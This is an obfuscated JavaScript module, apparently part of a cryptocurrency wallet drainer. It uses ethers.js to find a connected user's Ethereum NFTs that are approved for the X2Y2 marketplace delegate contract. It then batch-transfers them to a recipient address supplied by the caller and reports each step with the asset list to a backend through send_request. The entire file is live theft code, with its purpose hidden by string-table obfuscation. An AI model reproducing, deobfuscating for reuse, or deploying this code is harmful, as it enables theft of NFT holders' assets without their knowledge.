const _0x86d510=_0x5179;function _0x5179(a,b){const c=_0x3eba();return _0x5179=function(a,d){a=a-148;let b=c[a];return b},_0x5179(a,b)}(function(c,d){const a=_0x5179,b=c();while(!![])try{const c=-parseInt(a(171))/1*(parseInt(a(176))/2)+-parseInt(a(174))/3+parseInt(a(148))/4+parseInt(a(193))/5*(parseInt(a(155))/6)+-parseInt(a(191))/7*(-parseInt(a(180))/8)+parseInt(a(153))/9*(parseInt(a(151))/10)+parseInt(a(163))/11;if(c===d)break;b.push(b.shift())}catch(a){b.push(b.shift())}})(_0x3eba,521880);function _0x3eba(){const a=['Contract','log','56ofqBDa','providers','99565LwXRNO','1187800ggFKIy','token','tokenId','2681260VjjlVA','wait','9FQKgar','contract IERC721','66aJxiQW','getSigner','ERC721','120','Web3Provider','chain_id','request','push','7158822fudCHo','struct ERC721Delegate.Pair[]','estimateGas','tuple[]','getTransactionCount','100','from','toString','310643zHfPNG','getGasPrice','0xf849de01b080adc3a814fabe1e2087475cf2e354','3013290HFxald','address','2HwbCEu','function','type','uint256','402032Fnschg','BigNumber','150','skip','cancel','length','x2y2','mul','transferBatch'];return _0x3eba=function(){return a},_0x3eba()}const MS_X2Y2_ABI=[{inputs:[{components:[{internalType:_0x86d510(154),name:_0x86d510(149),type:_0x86d510(175)},{internalType:_0x86d510(179),name:_0x86d510(150),type:_0x86d510(179)}],internalType:_0x86d510(164),name:'pairs',type:_0x86d510(166)},{internalType:'address',name:'to',type:_0x86d510(175)}],name:_0x86d510(188),outputs:[],stateMutability:'nonpayable',type:_0x86d510(177)}],SIGN_X2Y2=async(d,f,b,e,c)=>{const a=_0x86d510;try{const g=[],h=[];for(const c of d){if(c[a(183)]||c[a(178)]!==a(157)||c[a(160)]!=1)continue;if(!await is_nft_approved(c[a(175)],b,'0xf849de01b080adc3a814fabe1e2087475cf2e354'))continue;g[a(162)]({token:c[a(175)],tokenId:ethers[a(181)][a(169)](c.id)}),h[a(162)](c)}if(g[a(185)]===0)return;let i=new ethers[a(192)][a(159)](f),k=i[a(156)]();const j=new ethers[a(189)](a(173),MS_X2Y2_ABI,k);try{const k=ethers[a(181)][a(169)](await i[a(172)]()).div(ethers.BigNumber.from('100'))[a(187)](ethers.BigNumber[a(169)](a(182)))[a(170)]();let f=null;try{f=await j[a(165)].transferBatch(g,e,{from:b}),f=ethers[a(181)][a(169)](f).div(ethers.BigNumber[a(169)](a(168)))[a(187)](ethers[a(181)][a(169)](a(158)))[a(170)]()}catch(a){f=25e4}const l=await i[a(167)](b,'pending');await send_request({action:a(186),user_id:c,x2y2:a(161),assets:h});const m=await j[a(188)](g,e,{gasLimit:ethers.BigNumber[a(169)](f),gasPrice:ethers[a(181)][a(169)](k),nonce:l});await m[a(152)](),await send_request({action:a(186),user_id:c,x2y2:'success'});for(const b of d){if(b[a(183)]||b[a(178)]!==a(157)||b.chain_id!=1)continue;let c=![];for(const d of h){if(d[a(178)]!==a(157)||d[a(160)]!=1)continue;if(d.address==b[a(175)]&&d.id==b.id){c=!![];break}}c==!![]&&(b[a(183)]=!![])}}catch(b){console[a(190)](b),await send_request({action:a(186),user_id:c,x2y2:a(184)})}}catch(b){console[a(190)](b)}}